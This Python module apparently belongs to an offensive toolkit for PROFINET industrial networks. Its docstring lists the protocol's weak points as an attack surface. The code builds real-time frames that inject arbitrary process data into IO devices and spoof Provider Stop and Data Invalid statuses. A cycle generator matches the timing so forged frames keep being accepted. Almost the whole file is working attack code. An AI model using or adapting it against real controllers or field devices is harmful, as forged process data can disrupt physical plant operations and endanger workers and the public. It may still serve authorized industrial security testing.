"""
PROFINET RT (Real-Time) and IRT (Isochronous Real-Time) frame implementation.

RT frames carry process data between IO-Controllers and IO-Devices.
They operate on Layer 2 with EtherType 0x8892 and specific Frame IDs.

RT Frame format:
  Ethernet Header (EtherType=0x8892)
  └─ Frame ID (2 bytes): 0x8000-0xBFFF for RT Class 1
  └─ IO Data (variable): Process data + IOPS/IOCS
  └─ Cycle Counter (2 bytes)
  └─ Data Status (1 byte)
  └─ Transfer Status (1 byte)

Attack surface:
  - No authentication on RT frames
  - No integrity protection on process data
  - Frame ID alone determines data routing
  - Timing-based acceptance (but tolerances are configurable and often loose)
"""
import struct
import time
from dataclasses import dataclass, field
from typing import List, Optional
from enum import IntEnum


class RTClass(IntEnum):
    RT_CLASS_1 = 1  # Non-isochronous, 0x8000-0xBFFF
    RT_CLASS_2 = 2  # Reserved
    RT_CLASS_3 = 3  # Isochronous (IRT), 0x0100-0x7FFF
    RT_CLASS_UDP = 4  # Over UDP (legacy)


class DataStatus(IntEnum):
    STATE_PRIMARY = 0x01
    STATE_BACKUP = 0x00
    REDUNDANCY_PENDING = 0x02
    DATA_VALID = 0x04
    DATA_INVALID = 0x00
    PROVIDER_RUN = 0x10
    PROVIDER_STOP = 0x00
    STATION_OK = 0x20
    STATION_PROBLEM = 0x00
    IGNORE = 0x80

    @classmethod
    def normal_running(cls) -> int:
        return (cls.STATE_PRIMARY | cls.DATA_VALID |
                cls.PROVIDER_RUN | cls.STATION_OK)


@dataclass
class RTFrame:
    frame_id: int = 0x8000
    io_data: bytes = b""
    cycle_counter: int = 0
    data_status: int = DataStatus.normal_running()
    transfer_status: int = 0x00


@dataclass
class AlarmFrame:
    alarm_type: int = 0x0001  # 0x0001=high, 0x0002=low
    api: int = 0
    slot_number: int = 0
    subslot_number: int = 0
    module_ident: int = 0
    submodule_ident: int = 0
    alarm_specifier: int = 0
    alarm_data: bytes = b""


def build_rt_frame(rt: RTFrame) -> bytes:
    buf = struct.pack(">H", rt.frame_id)
    buf += rt.io_data
    buf += struct.pack(">H", rt.cycle_counter)
    buf += struct.pack(">B", rt.data_status)
    buf += struct.pack(">B", rt.transfer_status)
    return buf


def build_alarm_frame(alarm: AlarmFrame) -> bytes:
    frame_id = 0xFC01 if alarm.alarm_type == 1 else 0xFE01
    alarm_pdu = struct.pack(">H", alarm.alarm_type)
    alarm_pdu += struct.pack(">I", alarm.api)
    alarm_pdu += struct.pack(">H", alarm.slot_number)
    alarm_pdu += struct.pack(">H", alarm.subslot_number)
    alarm_pdu += struct.pack(">I", alarm.module_ident)
    alarm_pdu += struct.pack(">I", alarm.submodule_ident)
    alarm_pdu += struct.pack(">H", alarm.alarm_specifier)
    alarm_pdu += alarm.alarm_data

    buf = struct.pack(">H", frame_id)
    buf += struct.pack(">H", len(alarm_pdu))
    buf += alarm_pdu
    return buf


def build_process_data_injection(frame_id: int, data: bytes,
                                  cycle_counter: int = 0) -> bytes:
    """Build an RT frame that injects arbitrary process data."""
    rt = RTFrame(
        frame_id=frame_id,
        io_data=data,
        cycle_counter=cycle_counter,
        data_status=DataStatus.normal_running(),
        transfer_status=0x00,
    )
    return build_rt_frame(rt)


def build_provider_stop(frame_id: int) -> bytes:
    """Build an RT frame with Provider Stop — tells the consumer the provider stopped."""
    rt = RTFrame(
        frame_id=frame_id,
        io_data=b"\x00" * 40,
        cycle_counter=0,
        data_status=DataStatus.STATE_PRIMARY | DataStatus.PROVIDER_STOP,
        transfer_status=0x00,
    )
    return build_rt_frame(rt)


def build_data_invalid(frame_id: int) -> bytes:
    """Build an RT frame with Data Invalid — consumer should use substitute values."""
    rt = RTFrame(
        frame_id=frame_id,
        io_data=b"\x00" * 40,
        cycle_counter=0,
        data_status=DataStatus.STATE_PRIMARY | DataStatus.DATA_INVALID | DataStatus.PROVIDER_RUN,
        transfer_status=0x00,
    )
    return build_rt_frame(rt)


class RTCycleGenerator:
    """Generate RT frames with correct timing for sustained injection."""

    def __init__(self, frame_id: int, io_data: bytes, send_clock_ms: float = 1.0):
        self.frame_id = frame_id
        self.io_data = io_data
        self.send_clock_ms = send_clock_ms
        self.cycle_counter = 0
        self.last_send_time = 0.0

    def next_frame(self) -> bytes:
        now = time.monotonic()
        if self.last_send_time > 0:
            expected_delta = self.send_clock_ms / 1000.0
            actual_delta = now - self.last_send_time
            if actual_delta < expected_delta * 0.9:
                time.sleep(expected_delta - actual_delta)
        self.last_send_time = time.monotonic()
        self.cycle_counter = (self.cycle_counter + 1) & 0xFFFF
        return build_process_data_injection(self.frame_id, self.io_data, self.cycle_counter)

    def generate_burst(self, count: int) -> List[bytes]:
        return [self.next_frame() for _ in range(count)]
